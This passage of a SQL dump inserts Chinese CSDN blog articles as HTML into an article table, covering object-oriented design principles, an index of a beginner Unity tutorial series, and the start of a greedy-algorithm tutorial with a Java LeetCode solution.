<p><strong>迪米特法则：如果两个类不必彼此直接通信，那么这两个类就不应当发生直接的相互作用。如果其中一个类需要调用另一个类的某个方法的话，可以通过第三者转发这个调用。</strong></p> \n </blockquote> \n <hr> \n <h1><a id=\"_144\"></a>五，接口分离原则</h1> \n <h2><a id=\"51__146\"></a>5.1 如何理解接口隔离原则？</h2> \n <p>理解“接口隔离原则”的重点是理解其中“接口”二字：</p> \n <ul>\n  <li><strong>若把“接口”理解为面向对象中的接口</strong>，那接口的设计要尽量单一，不要让实现类有用不到的接口函数。<br> 比如说：A类实现I接口，I接口中有X()，Y()两个函数；若A类只需要用X()，那么这样的设计是不合理的。</li>\n  <li><strong>若把“接口”理解为一组接口的集合</strong>，可以是某个类库的接口。如果使用的类只需要调用其中的部分接口，那么我们需要将这部分接口隔离出来，单独给部分调用者使用。</li>\n </ul> \n <h2><a id=\"52__154\"></a>5.2 与单一职责原则的区别</h2> \n <ul>\n  <li>单一职责针对的是模块、类、接口的设计。接口隔离原则相对于单一职责原则，一方面更侧重接口的设计，另一方面它的思考角度也是不同的</li>\n  <li>接口隔离原则则提供了一种判断接口的职责是否单一的标准：通过调用者如何使用接口间接地判定。如果调用者只使用部分接口或部分接口的功能，那接口设计的就不够单一。</li>\n </ul> \n <blockquote> \n  <p><strong>接口隔离原则：不应该强迫对象依赖它不需要的接口。</strong></p> \n </blockquote> \n <hr> \n <h1><a id=\"_165\"></a>六，依赖倒置原则</h1> \n <h2><a id=\"61___167\"></a>6.1 举例说明: 电脑主板</h2> \n <p>  昨天公司美术妹子的电脑用着用着突然蓝屏了，来找我帮忙看看咋回事。根据我的经验是内存条坏了，于是我打开机箱拆下内存条，更换插槽各种操作，最终确定了就是其中的一个内存条坏了。换了个新的内存条，电脑成功启动。<br> <img src=\"https://img-blog.csdnimg.cn/img_convert/9cdfd3363bd9780e261843d387d8d201.gif#pic_center\" alt=\"\"></p> \n <p>  能这么轻松的解决问题还是要归功于PC的易插拔设计，不管是内存、显卡、硬盘等任何部件坏了，我们只需更换坏的那个就可以了。**这种易插拔在面向对象中就是强内聚，低耦合。</p> \n <p>   ** 因为无论是那个厂家制造的这内存条，也不管它的内部实现是什么样的，它最终都需要支持主板的插槽。<strong>这就是针对接口设计。若针对实现设计，那么很打可能我们的内存条坏了，也需要更换对应的主板。</strong></p> \n <h2><a id=\"62___176\"></a>6.2 原则解析: 依赖倒置</h2> \n <p>  <font color=\"red\">依赖倒置设计理念: 相对于细节的多变性，抽象的东西要文档的多。以抽象为基础搭建的架构比细节为基础搭建的架构要稳定的多。依赖倒置的中心思想是面向接口编程。</font></p> \n <p>  面向过程开发时，为了使得常用的代码可以复用，一般都会吧这些常用的代码写成许许多多函数的程序库，这样我们在做新项目时，去调用这些低层的函数就可以了。</p> \n <ul>\n  <li>依赖倒置的定义:</li>\n </ul> \n <blockquote> \n  <p>依赖倒置原则：<br> A.高层模块不应该依赖底层模块。两个都应该依赖抽象。<br> B.抽象不应该依赖细节。细节应该依赖抽象。</p> \n </blockquote> \n <hr> \n <h1><a id=\"_192\"></a>七，合成/聚合复用原则</h1> \n <blockquote> \n  <p>之前我的理解是：合成复用 和 聚合复用 是两个名字一个意思。后来具体学习了才知道，其实并不是这样，可以说这是两种相近的设计模式。到底是怎么回事？ 往下看看吧~</p> \n </blockquote> \n <h2><a id=\"71___196\"></a>7.1 举例说明: 兵线队列</h2> \n <p>合成和聚合都是关联的特殊种类：</p> \n <ul>\n  <li>聚合表示一种弱的‘拥有’关系，体现的是A对象包含B对象，但B对象不是A的对象的一部分</li>\n  <li>合成则表示一种强的‘拥有’关系，体现了严格的部分和整体的关系，部分和整体的生命周期是一致的。</li>\n </ul> \n <p><img src=\"https://img-blog.csdnimg.cn/20210609200324625.png\" alt=\"7.1\"></p> \n <p>  比方说：王者荣耀中的兵线，每一波兵线都由多个小兵组成，每个小兵都属于一队兵线，一队兵线和多个小兵是聚合关系。 而每个小兵都有一个的武器(攻击类)，武器和小兵是部分与整体的关系，并且他们的生命周期是相同的，于是小兵和武器就是合成关系。</p> \n <h2><a id=\"72___207\"></a>7.2 原则解析: 合成/聚合复用</h2> \n <p>  合成/聚合复用的好处：优先使用对象的合成/聚合将有助于我们保存封装每个类，并被集中在单个任务上。这样类和类的继承层次会保持较小规模，并且不太可能增长为不可控制打庞然大物。</p> \n <ul>\n  <li>合成/聚合复用原则的定义:</li>\n </ul> \n <blockquote> \n  <p><strong>合成/聚合复用：尽量使用合成/聚合，尽量要使用类的继承。</strong></p> \n </blockquote> \n <hr> \n <p>  文中有两个原则的举例说明，我实在是没想出怎么用王者荣耀相关内容举例分析。若你有好的想法欢迎评论区补充。</p> \n <p>学习完了休息一下吧，走打王者去~<br> <img src=\"https://img-blog.csdnimg.cn/img_convert/163cd52bba19ce3e993c80ba22a13128.gif#pic_center\" alt=\"王者\"></p> \n</div>', '2021-06-12', NULL, '默认分类', '', 1, 1, NULL, NULL, 1);
INSERT INTO `t_article` VALUES (42, 'Unity零基础到入门 ☀️| 基础知识入门篇章，看完就可以做游戏啦！ | 寻找C站宝藏', '<div id=\"content_views\" class=\"markdown_views prism-dracula\"> \n <svg xmlns=\"http://www.w3.org/2000/svg\" style=\"display: none;\"> \n  <path stroke-linecap=\"round\" d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path> \n </svg> \n <blockquote> \n  <ul>\n   <li><font color=\"#48d1cc\" size=\"4\">📢博客主页：<a href=\"https://blog.csdn.net/zhangay1998\">https://blog.csdn.net/zhangay1998</a></font></li>\n   <li><font color=\"#db7093\" size=\"4\">📢欢迎点赞 👍 收藏 ⭐留言 📝 如有错误敬请指正！ </font></li>\n   <li><font color=\"#32cd32\" size=\"4\">📢本文由 God Y.原创，首发于 CSDN🙉</font></li>\n   <li><font color=\"#ee82ee\" size=\"4\">📢未来很长，值得我们全力奔赴更美好美好的生活✨</font></li>\n  </ul> \n </blockquote> \n <hr> \n <p></p> \n <div class=\"toc\"> \n  <h3> </h3> \n  <ul>\n   <li><a href=\"#CUnity_11\">❤️寻找C站宝藏-Unity</a></li>\n   <li>\n    <ul>\n     <li>\n      <ul>\n       <li>\n        <ul>\n         <li><a href=\"#_12\">📢前言</a></li>\n        </ul> </li>\n       <li><a href=\"#Unity__Unity___33\">🧡Unity零基础到入门(一) ☀️| 一起走进游戏引擎界大佬——Unity 的陈情往事(^_−)☆</a></li>\n       <li><a href=\"#Unity__UnityUnityHubUnity_42\">💛Unity零基础到入门(二) ☀️| Unity下载安装---使用UnityHub下载各个版本的Unity（收藏）</a></li>\n       <li><a href=\"#Unity___Unity__52\">💚Unity零基础到入门(三) ☀️| 轻松学会 Unity界面布局和简单实例——入门级！(^_−)☆</a></li>\n       <li><a href=\"#Unity__Unity__68\">💙Unity零基础到入门(四) ☀️| 学会这些Unity实用知识点，我也可以做小游戏啦！(^_−)☆</a></li>\n       <li><a href=\"#Unity__Unity3A__78\">💜Unity零基础到入门(五) ☀️| 学会这些Unity常用组件，我离开发⭐️3A游戏大作⭐️又近了一步！(^_−)☆</a></li>\n       <li><a href=\"#Unity__Unity_99\">💗Unity零基础到入门(六) ☀️| 只差这篇让你学会Unity中最重要的部分——脚本组件✨</a></li>\n       <li><a href=\"#Unity__Unity_UI_113\">💖Unity零基础到入门(七) ☀️| 认识Unity引擎中几种最常用 UI系统，这一篇文章就够用了！</a></li>\n       <li><a href=\"#Unity___Unity__UGUI_125\">💘Unity零基础到入门(八) ☀️| 轻松学会 Unity 的 UGUI基础控件的使用（包括一个简易血条、蓝条设计）</a></li>\n       <li><a href=\"#Unity__Unity_GC__v___136\">💞Unity零基础到进阶 ☀️| Unity中的 GC及优化 超级全面解析 ☆(ゝω･)v 建议收藏！</a></li>\n      </ul> </li>\n    </ul> </li>\n   <li><a href=\"#_147\">💬总结</a></li>\n  </ul> \n </div> \n <p></p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210610100845788.jpg#pic_center\" alt=\"在这里插入图片描述\"></p> \n <hr> \n <h1><a id=\"CUnity_11\"></a>❤️寻找C站宝藏-Unity</h1> \n <h4><a id=\"_12\"></a>📢前言</h4> \n <ul>\n  <li>本篇文章是对于一个<font color=\"#db7093\" size=\"4\">Unity基础知识专栏</font>做的一个详细介绍</li>\n  <li>让大家可以更方便的学会一些<strong>Unity</strong>的入门知识</li>\n  <li>对于<strong>Unity</strong>感兴趣的小伙伴，你们的福利来了哦，快来跟我一起来看一下吧~</li>\n </ul> \n <blockquote> \n  <p>Unity入门系列文章<br> 以下文章专栏链接：<a href=\"https://blog.csdn.net/zhangay1998/category_11121727.html\">Unity基础知识学习专栏</a></p> \n  <ul>\n   <li><a href=\"https://blog.csdn.net/zhangay1998/article/details/116864732\">Unity零基础到入门(一) ☀️| 一起走进游戏引擎界大佬——Unity 的陈情往事(^_−)☆</a></li>\n   <li><a href=\"https://blog.csdn.net/zhangay1998/article/details/113571681\">Unity零基础到入门(二) ☀️| Unity下载安装—使用UnityHub下载各个版本的Unity（收藏）</a></li>\n   <li><a href=\"https://blog.csdn.net/zhangay1998/article/details/116866910\">Unity零基础到入门(三) ☀️| 轻松学会 Unity界面布局和简单实例——入门级！(^_−)☆</a></li>\n   <li><a href=\"https://blog.csdn.net/zhangay1998/article/details/116980007\">Unity零基础到入门(四) ☀️| 学会这些Unity实用知识点，我也可以做小游戏啦！(^_−)☆</a></li>\n   <li><a href=\"https://blog.csdn.net/zhangay1998/article/details/117044525\">Unity零基础到入门(五) ☀️| 学会这些Unity常用组件，我离开发⭐️3A游戏大作⭐️又近了一步！(^_−)☆</a></li>\n   <li><a href=\"https://blog.csdn.net/zhangay1998/article/details/117318835\">Unity零基础到入门(六) ☀️| 只差这篇让你学会Unity中最重要的部分——脚本组件✨</a></li>\n   <li><a href=\"https://blog.csdn.net/zhangay1998/article/details/117136391\">Unity零基础到入门(七) ☀️| 认识Unity引擎中几种最常用 UI系统，这一篇文章就够用了！</a></li>\n   <li><a href=\"https://blog.csdn.net/zhangay1998/article/details/117409577\">Unity零基础到入门(八) ☀️| 轻松学会 Unity 的 UGUI基础控件的使用（包括一个简易血条、蓝条设计）</a></li>\n   <li><a href=\"https://blog.csdn.net/zhangay1998/article/details/116531700\">Unity零基础到进阶 ☀️| Unity中的 GC及优化 超级全面解析 ☆(ゝω･)v 建议收藏！</a></li>\n  </ul> \n </blockquote> \n <hr> \n <h3><a id=\"Unity__Unity___33\"></a>🧡Unity零基础到入门(一) ☀️| 一起走进游戏引擎界大佬——Unity 的陈情往事(^_−)☆</h3> \n <ul>\n  <li>这一篇文章对<strong>Unity</strong>的背景故事、简介、发展历程和Unity的特色做了一个详细介绍</li>\n  <li>如果你对Unity引擎了解的不够多，甚至你只听说过<strong>Unity</strong>，连它是什么都不知道，那你更要来看一下了</li>\n  <li>最起码看完这一篇文章，可以让你知道<strong>Unity</strong>到底是个什么东西，以后别人如果提及，你也可以朗朗上口两句，倍有面子~</li>\n </ul> \n <p><a href=\"https://blog.csdn.net/zhangay1998/article/details/116864732\">这是本篇文章的链接和目录，感兴趣的小伙伴可以直接点解链接就可以去详细了解啦~</a><br> <img src=\"https://img-blog.csdnimg.cn/20210610085401574.png#pic_center\" alt=\"在这里插入图片描述\"></p> \n <hr> \n <h3><a id=\"Unity__UnityUnityHubUnity_42\"></a>💛Unity零基础到入门(二) ☀️| Unity下载安装—使用UnityHub下载各个版本的Unity（收藏）</h3> \n <ul>\n  <li>这篇文章的内容很简单，介绍了<strong>Unity</strong>各个版本的安装使用</li>\n  <li>对于想开始上手操作<strong>Unity</strong>的小伙伴来说，可以直接去下载一个<strong>Unity</strong>自己上手上手体验一番啦</li>\n  <li>在看完本系列文章后，我博客发的坦克大战和飞机大战的小游戏，正好拿来上手自己做一个玩！</li>\n </ul> \n <p><a href=\"https://blog.csdn.net/zhangay1998/article/details/113571681\">这是本篇文章，感兴趣的小伙伴可以直接点解链接就可以去详细了解啦~</a><br> <img src=\"https://img-blog.csdnimg.cn/20210610091031884.png#pic_center\" alt=\"在这里插入图片描述\"></p> \n <hr> \n <h3><a id=\"Unity___Unity__52\"></a>💚Unity零基础到入门(三) ☀️| 轻松学会 Unity界面布局和简单实例——入门级！(^_−)☆</h3> \n <ul>\n  <li>从这一篇文章开始，就要正儿八经的进入学习知识的阶段了~</li>\n  <li>这篇文章着重介绍了<strong>Unity</strong>的界面布局，并且用一个简单实例来做简单教学</li>\n  <li>那文章一开始呢，就提供了<strong>Unity的官方下载链接</strong></li>\n  <li>然后就开始从<strong>创建第一个工程</strong>开始，介绍Unity各种界面功能，以及如何创建</li>\n  <li>进入<strong>Unity</strong>之后，对Unity的<strong>六大视图</strong>也做了一个图示介绍</li>\n  <li>还有<strong>Unity</strong>的<strong>快捷栏</strong>和<strong>菜单栏</strong>也分别做了详细介绍</li>\n  <li>对<strong>Unity</strong>工程中常用的<strong>键盘快捷键</strong>也整理了一份</li>\n  <li>在最后也是简单的创建了一个实例操作，整理而言还是介绍的很详细~</li>\n </ul> \n <p><a href=\"https://blog.csdn.net/zhangay1998/article/details/116866910\">这是本篇文章的目录，感兴趣的小伙伴可以直接点解链接就可以去详细了解啦~</a><br> <img src=\"https://img-blog.csdnimg.cn/20210610091130895.png#pic_center\" alt=\"在这里插入图片描述\"></p> \n <hr> \n <h3><a id=\"Unity__Unity__68\"></a>💙Unity零基础到入门(四) ☀️| 学会这些Unity实用知识点，我也可以做小游戏啦！(^_−)☆</h3> \n <ul>\n  <li>这篇文章对Unity中的一些最基础知识进行了介绍</li>\n  <li>包括游戏组成、什么是游戏对象、地形、坐标系等等做了一个基础的介绍</li>\n  <li>看完这篇文章就会对Unity中的常用知识有了一定了解，才能去更好的使用Unity引擎去创作更多有趣的事情</li>\n </ul> \n <p><a href=\"https://blog.csdn.net/zhangay1998/article/details/116980007\">这是本篇文章的目录，感兴趣的小伙伴可以直接点解链接就可以去详细了解啦~</a><br> <img src=\"https://img-blog.csdnimg.cn/20210610092103221.png#pic_center\" alt=\"在这里插入图片描述\"></p> \n <hr> \n <h3><a id=\"Unity__Unity3A__78\"></a>💜Unity零基础到入门(五) ☀️| 学会这些Unity常用组件，我离开发⭐️3A游戏大作⭐️又近了一步！(^_−)☆</h3> \n <ul>\n  <li>如果本系列看到这里，才算是真正的可以上手操作一些东西了</li>\n  <li>前面的都是最基础的理论介绍，这里的话就可以上手操作了</li>\n  <li>这篇文章介绍了<strong>Unity</strong>中最常用的东西——<strong>组件</strong></li>\n  <li>为什么说<strong>组件</strong>最常用呢？</li>\n  <li>因为所有的游戏对象(GameObject)都是因为自身添加的组件不同，才使他们有了不同的作用</li>\n  <li>这篇文章对Unity常用的组件做了介绍，保你看完不迷路~</li>\n </ul> \n <p>文章一开始先介绍了一下什么是组件，以及<strong>Unity</strong>中很精髓的三句话：</p> \n <ul>\n  <li><font color=\"#48d1cc\" size=\"4\">一个游戏由多个场景（Scene）组成</font></li>\n  <li><font color=\"#48d1cc\" size=\"4\">一个场景由多个游戏物体（GameObject）组成</font></li>\n  <li><font color=\"#48d1cc\" size=\"4\">一个游戏物体由多个组件（Component）组成</font></li>\n </ul> \n <p>还顺带介绍了<strong>Unity</strong>的工程结构<br> 然后就是介绍了一些<strong>Unity</strong>中常用的组件了</p> \n <p><a href=\"https://blog.csdn.net/zhangay1998/article/details/117044525\">这是本篇文章的目录，感兴趣的小伙伴可以直接点解链接就可以去详细了解啦~</a><br> <img src=\"https://img-blog.csdnimg.cn/20210610092439554.png#pic_center\" alt=\"在这里插入图片描述\"></p> \n <hr> \n <h3><a id=\"Unity__Unity_99\"></a>💗Unity零基础到入门(六) ☀️| 只差这篇让你学会Unity中最重要的部分——脚本组件✨</h3> \n <ul>\n  <li> <p>有的小伙伴就要问了脚本也算<strong>Unity</strong>中的一个<strong>组件</strong>，上一篇文章介绍了<strong>Unity</strong>中的<strong>组件</strong>，为什么不放在上一篇中介绍呢？</p> </li>\n  <li> <p>因为脚本在<strong>Unity</strong>中的地位还是很重要的，毕竟所有的游戏逻辑和操作都是在脚本中执行的</p> </li>\n  <li> <p>一个引擎再牛，也还是要靠写<strong>代码</strong>才能操作的起来呀哈哈！</p> </li>\n  <li> <p>那这篇文章就对<strong>Unity</strong>中的脚本组件做了一个非常详细的介绍，不够详细你顺着网线来咬我~</p> </li>\n  <li> <p>文章对<strong>Unity</strong>的 脚本概念、开发工具、脚本结构、脚本生命周期和调试方法都做了介绍</p> </li>\n  <li> <p>还介绍了一些常用<strong>API</strong>，包你看的满意，学的舒心~</p> </li>\n </ul> \n <p><a href=\"https://blog.csdn.net/zhangay1998/article/details/117318835\">这是本篇文章的目录，感兴趣的小伙伴可以直接点解链接就可以去详细了解啦~</a><br> <img src=\"https://img-blog.csdnimg.cn/20210610093914248.png#pic_center\" alt=\"在这里插入图片描述\"></p> \n <hr> \n <h3><a id=\"Unity__Unity_UI_113\"></a>💖Unity零基础到入门(七) ☀️| 认识Unity引擎中几种最常用 UI系统，这一篇文章就够用了！</h3> \n <ul>\n  <li>在一个游戏中，<strong>UI</strong>是最能直观与用户体验挂钩的</li>\n  <li>因为不管是游戏也好，软件也好，用户打开的第一感官，就是<strong>UI</strong>带来的</li>\n  <li>这篇文章 对Unity中几种常用的<strong>UI</strong>系统做了一个简单介绍，包括<strong>GUI</strong>、<strong>UGUI</strong>、<strong>NGUI</strong>、<strong>FairyGUI</strong>等</li>\n  <li>着重介绍的还是<strong>UGUI</strong>，因为<strong>UGUI</strong>是<strong>Unity</strong>现在用的比较多的</li>\n  <li>包括<strong>UGUI</strong>中一些常用的组件，比如文本框、图片和按钮等等</li>\n  <li>对<strong>UI</strong>的认知，那肯定不能错过这篇文章啦！</li>\n </ul> \n <p><a href=\"https://blog.csdn.net/zhangay1998/article/details/117136391\">这是本篇文章的目录，感兴趣的小伙伴可以直接点解链接就可以去详细了解啦~</a><br> <img src=\"https://img-blog.csdnimg.cn/20210610094035466.png#pic_center\" alt=\"在这里插入图片描述\"></p> \n <hr> \n <h3><a id=\"Unity___Unity__UGUI_125\"></a>💘Unity零基础到入门(八) ☀️| 轻松学会 Unity 的 UGUI基础控件的使用（包括一个简易血条、蓝条设计）</h3> \n <ul>\n  <li>上一篇文章介绍了<strong>Unity</strong>中的几种<strong>UI</strong>系统</li>\n  <li>那这篇文章就对<strong>UGUI</strong>来做一个更加详细的使用说明，以及参考案例</li>\n  <li>末尾还有一个血条、蓝条的小<strong>Demo</strong></li>\n  <li>看完这篇文章，就可以基本上手<strong>UGUI</strong>的实际操作了！</li>\n </ul> \n <p><a href=\"https://blog.csdn.net/zhangay1998/article/details/117409577\">这是本篇文章的目录，感兴趣的小伙伴可以直接点解链接就可以去详细了解啦~</a><br> <img src=\"https://img-blog.csdnimg.cn/20210610094609947.png#pic_center\" alt=\"在这里插入图片描述\"></p> \n <hr> \n <h3><a id=\"Unity__Unity_GC__v___136\"></a>💞Unity零基础到进阶 ☀️| Unity中的 GC及优化 超级全面解析 ☆(ゝω･)v 建议收藏！</h3> \n <ul>\n  <li>到这里的话，<strong>Unity</strong>的基础知识已经算是学完了</li>\n  <li>这一篇文章是额外提了一下<strong>Unity</strong>中的<strong>GC优化</strong>，可以让你对<strong>Unity</strong>中的<strong>优化</strong>有一个简单了解</li>\n  <li>以免在操作项目的时候造成过多的资源浪费</li>\n  <li>这篇文章介绍的还是很全了，把上面的知识吃透以后，再看这篇文章就会觉得真心有用！！！</li>\n </ul> \n <p><a href=\"https://blog.csdn.net/zhangay1998/article/details/116531700\">这是本篇文章的目录，感兴趣的小伙伴可以直接点解链接就可以去详细了解啦~</a><br> <img src=\"https://img-blog.csdnimg.cn/20210610095035801.png#pic_center\" alt=\"在这里插入图片描述\"></p> \n <hr> \n <h1><a id=\"_147\"></a>💬总结</h1> \n <ul>\n  <li>本篇文章是对个人写的<font color=\"#db7093\" size=\"4\">Unity基础知识专栏</font>做了一个介绍，也是相当于一个知识学习的索引吧</li>\n  <li>希望能对大家的学习有所帮助</li>\n </ul> \n <p>那下次再见啦~<br> <img src=\"https://img-blog.csdnimg.cn/20210610100725659.gif#pic_center\" alt=\"在这里插入图片描述\"></p> \n</div>', '2021-06-12', NULL, '默认分类', '', 1, 0, NULL, NULL, 0);
INSERT INTO `t_article` VALUES (43, '扔掉你的算法书！1小时零基础拿下贪心算法！（17道题+万字儿童级解析+数十张图解）', '<div id=\"content_views\" class=\"markdown_views prism-atom-one-dark\"> \n <svg xmlns=\"http://www.w3.org/2000/svg\" style=\"display: none;\"> \n  <path stroke-linecap=\"round\" d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path> \n </svg> \n <p>前几天的文章中我写到了一些关于零基础学习回溯算法的一些步骤和细节，在刷题的过程中发现了很多贪心算法的题很有趣，于是今天他来了，准备了好<strong>17道题</strong>来供大家共同学习，并附上了十分<strong>详细的题解</strong>，与<strong>附带了注释的优美代码</strong>，每个题的题解都可以说是<strong>隔壁牛大爷都看得懂</strong>了咯，相信<strong>聪明的小伙伴们一定可以快速上手拿下这个有趣的算法思想</strong>。有点长，<strong>建议收藏反复观看，</strong><mark>文章附带进度条！！可视化你的进步～</mark></p> \n <p><strong>贪心算法零基础到快速变成高手</strong><br> </p> \n <div class=\"toc\"> \n  <h3>文章目录</h3> \n  <ul>\n   <li>\n    <ul>\n     <li><a href=\"#1httpsleetcodecncomproblemsassigncookies_7\">1.分发饼干</a></li>\n     <li><a href=\"#2httpsleetcodecncomproblemswigglesubsequence_42\">2.摆动序列</a></li>\n     <li><a href=\"#3httpsleetcodecncomproblemsmaximumsubarray_86\">3.最大子序和</a></li>\n     <li><a href=\"#4IIhttpsleetcodecncomproblemsbesttimetobuyandsellstockii_133\">4.买卖股票的最佳时机II</a></li>\n     <li><a href=\"#5httpsleetcodecncomproblemsjumpgame_175\">5.跳跃游戏</a></li>\n     <li><a href=\"#6IIhttpsleetcodecncomproblemsjumpgameii_212\">6.跳跃游戏II</a></li>\n     <li><a href=\"#7Khttpsleetcodecncomproblemsmaximizesumofarrayafterknegations_260\">7.K次取反后最大化的数组和</a></li>\n     <li><a href=\"#8httpsleetcodecncomproblemsgasstation_303\">8.加油站</a></li>\n     <li><a href=\"#9httpsleetcodecncomproblemscandy_348\">9.分发糖果</a></li>\n     <li><a href=\"#10httpsleetcodecncomproblemslemonadechange_389\">10.柠檬水找零</a></li>\n     <li><a href=\"#11httpsleetcodecncomproblemsqueuereconstructionbyheight_446\">11.根据身高重建队列</a></li>\n     <li><a href=\"#12httpsleetcodecncomproblemsminimumnumberofarrowstoburstballoons_484\">12.用最少数量的箭引爆气球</a></li>\n     <li><a href=\"#13httpsleetcodecncomproblemsnonoverlappingintervals_539\">13.无重叠区间</a></li>\n     <li><a href=\"#14httpsleetcodecncomproblemspartitionlabels_588\">14.划分字母区间</a></li>\n     <li><a href=\"#15httpsleetcodecncomproblemsmonotoneincreasingdigits_677\">15.单调递增的数字</a></li>\n     <li><a href=\"#16httpsleetcodecncomproblemsbesttimetobuyandsellstockwithtransactionfee_724\">16.买卖股票的最佳时机含手续费</a></li>\n     <li><a href=\"#17httpsleetcodecncomproblemsbinarytreecameras_770\">17.监控二叉树</a></li>\n    </ul> </li>\n  </ul> \n </div> \n <br> 上干货～~（ \n <strong>文末有福利喔～</strong>） \n <br> \n <img src=\"https://img-blog.csdnimg.cn/20210608061916151.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2U5MzUwNTIzMTk=,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"> \n <p></p> \n <h2><a id=\"1httpsleetcodecncomproblemsassigncookies_7\"></a><a href=\"https://leetcode-cn.com/problems/assign-cookies/\">1.分发饼干</a></h2> \n <blockquote> \n  <p>假设你是一位很棒的家长，想要给你的孩子们一些小饼干。但是，每个孩子最多只能给一块饼干。<br> 对每个孩子 i，都有一个胃口值 g[i]，这是能让孩子们满足胃口的饼干的最小尺寸；并且每块饼干 j，都有一个尺寸 s[j] 。如果 s[j] &gt;= g[i]，我们可以将这个饼干 j 分配给孩子 i ，这个孩子会得到满足。你的目标是尽可能满足越多数量的孩子，并输出这个最大数值。<br> <img src=\"https://img-blog.csdnimg.cn/2021060806311755.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2U5MzUwNTIzMTk=,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> <font color=\"#00f\"><strong>解题思路:</strong></font><br> 这是一道入门贪心算法十分基础的题目啦～<br> <strong>问题分析</strong>：首先我们要想满足更多的孩子，是不是想着尽量用最小尺寸的小饼干去满足孩子，这样就能匀出来尺寸大的小饼干去满足胃口比较大的孩子啦。<br> <strong>问题抽象</strong>：将两个数组进行排序，在同时扫描。<br> <strong>实现步骤</strong>：<br> 1、排序两个数组。<br> 2、扫描饼干尺寸数组，如果能狗满足胃口最小的，就将结果 + 1，并更新胃口数组的下标。</p> \n </blockquote> \n <pre><code class=\"prism language-java\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">Solution</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">int</span> <span class=\"token function\">findContentChildren</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> g<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> s<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n        <span class=\"token keyword\">int</span> ans <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">.</span>length <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token operator\">||</span> g<span class=\"token punctuation\">.</span>length <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> ans<span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 使用Arrays类的方法，对数组进行排序</span>\n        <span class=\"token class-name\">Arrays</span><span class=\"token punctuation\">.</span><span class=\"token function\">sort</span><span class=\"token punctuation\">(</span>g<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Arrays</span><span class=\"token punctuation\">.</span><span class=\"token function\">sort</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 扫描两个数组（本质是扫描一个饼干尺寸数组）</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> g<span class=\"token punctuation\">.</span>length <span class=\"token operator\">&amp;&amp;</span> j <span class=\"token operator\">&lt;</span> s<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> j <span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n        	<span class=\"token comment\">// 满足 存在最小尺寸的饼干 给胃口最小的孩子</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">&gt;=</span> g<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n                ans <span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n                i <span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">return</span> ans<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre> \n <blockquote> \n  <p>恭喜你入门啦，完成进度：<br> <img src=\"https://img-blog.csdnimg.cn/20210608070637452.png\" alt=\"在这里插入图片描述\"></p> \n </blockquote> \n <hr> \n <h2><a id=\"2httpsleetcodecncomproblemswigglesubsequence_42\"></a><a href=\"https://leetcode-cn.com/problems/wiggle-subsequence/\">2.摆动序列</a></h2> \n <blockquote> \n  <p>如果连续数字之间的差严格地在正数和负数之间交替，则数字序列称为 摆动序列 。第一个差（如果存在的话）可能是正数或负数。仅有一个元素或者含两个不等元素的序列也视作摆动序列。<br> 例如， [1, 7, 4, 9, 2, 5] 是一个 摆动序列 ，因为差值 (6, -3, 5, -7, 3) 是正负交替出现的。<br> 相反，[1, 4, 7, 2, 5] 和 [1, 7, 4, 5, 5] 不是摆动序列，第一个序列是因为它的前两个差值都是正数，第二个序列是因为它的最后一个差值为零。<br> 子序列 可以通过从原始序列中删除一些（也可以不删除）元素来获得，剩下的元素保持其原始顺序。<br> 给你一个整数数组 nums ，返回 nums 中作为 摆动序列 的 最长子序列的长度 。<br> <img src=\"https://img-blog.csdnimg.cn/20210608064702251.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2U5MzUwNTIzMTk=,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> <font 